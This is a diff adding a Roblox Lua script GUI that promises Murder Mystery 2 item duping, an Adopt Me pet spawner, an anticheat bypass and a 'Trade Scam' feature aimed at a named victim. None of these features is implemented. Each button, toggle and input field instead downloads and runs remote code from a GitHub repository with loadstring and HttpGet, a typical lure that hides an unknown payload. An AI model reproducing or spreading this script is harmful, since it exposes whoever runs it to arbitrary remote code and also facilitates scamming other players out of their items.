@@ -1,0 +1,138 @@
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+-- Create the UI Window
+local Window = Rayfield:CreateWindow({
+    Name = "🔥 Mm2 & Adopt Me Scripts 🔥",
+    LoadingTitle = "Loading Gui ...",
+    LoadingSubtitle = "Made by the man himself  DHubOnTop",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "MyScriptData",
+        FileName = "UserSettings"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "",
+        RememberJoins = false
+    },
+    KeySystem = false,
+    KeySettings = {
+        Title = "Script Key System",
+        Subtitle = "Enter your key below or get it from Discord",
+        Note = "Find the key in our Discord or visit the key website",
+        FileName = "KeyData",
+        SaveKey = false,
+        GrabKeyFromSite = false,
+        Key = {"DHubOnTop"}
+    }
+})
+
+-- Key Tab
+local KeyTab = Window:CreateTab("Key System")
+KeyTab:CreateSection("Enter Your Key")
+
+local UserInputKey = ""
+KeyTab:CreateInput({
+    Name = "Enter Key",
+    PlaceholderText = "Paste Key Here",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(value)
+        UserInputKey = value
+    end
+})
+
+KeyTab:CreateButton({
+    Name = "Submit Key",
+    Callback = function()
+        if UserInputKey == "DHubOnTop" then
+            Rayfield:Notify({
+                Title = "Success",
+                Content = "Key Accepted! Loading script...",
+                Duration = 3
+            })
+            wait(2)
+            KeyTab.TabVisible = false
+            LoadMainScript()
+        else
+            Rayfield:Notify({
+                Title = "Invalid Key",
+                Content = "Key is in Pastebin!",
+                Duration = 3
+            })
+        end
+    end
+})
+
+KeyTab:CreateButton({
+    Name = "Get Key from Website",
+    Callback = function()
+        setclipboard("https://pastebin.com/raw/1baFXLEn")
+        Rayfield:Notify({
+            Title = "Key Link Copied!",
+            Content = "Paste it in your browser to open.",
+            Duration = 5
+        })
+    end
+})
+
+-- Main Script (After Key)
+function LoadMainScript()
+    -- Freeze Trade Tab
+    local MainTab = Window:CreateTab("Freeze Trade")
+    MainTab:CreateSection("Script Features")
+
+    MainTab:CreateButton({
+        Name = "Bypass Anticheat (Wait 5 min to bypass)",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test"))()
+        end
+    })
+
+    MainTab:CreateToggle({
+        Name = "Trade Scam",
+        CurrentValue = false,
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test"))()
+        end
+    })
+
+    MainTab:CreateInput({
+        Name = "User you are scamming",
+        PlaceholderText = "Type here...",
+        RemoveTextAfterFocusLost = false,
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test"))()
+        end
+    })
+
+    -- Dupe Tab
+    local DupeTab = Window:CreateTab("Mm2 Dupe all items")
+    DupeTab:CreateSection("Script Features")
+
+    DupeTab:CreateButton({
+        Name = "Dupe all items",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/formm2d"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test"))()
+            Rayfield:Notify({
+                Title = "Duping in Progress",
+                Content = "Wait 5 mins to be able to trade them",
+                Duration = 6
+            })
+        end
+    })
+
+    DupeTab:CreateLabel("Wait 5 Mins to fully work")
+
+    -- Adopt Me Tab
+    local AdoptTab = Window:CreateTab("Adopt Me Pet Spawner")
+    AdoptTab:CreateSection("Pet Spawner")
+
+    AdoptTab:CreateButton({
+        Name = "Execute pet Spawner",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/foradoptgui"))()
+        end
+    })
+end
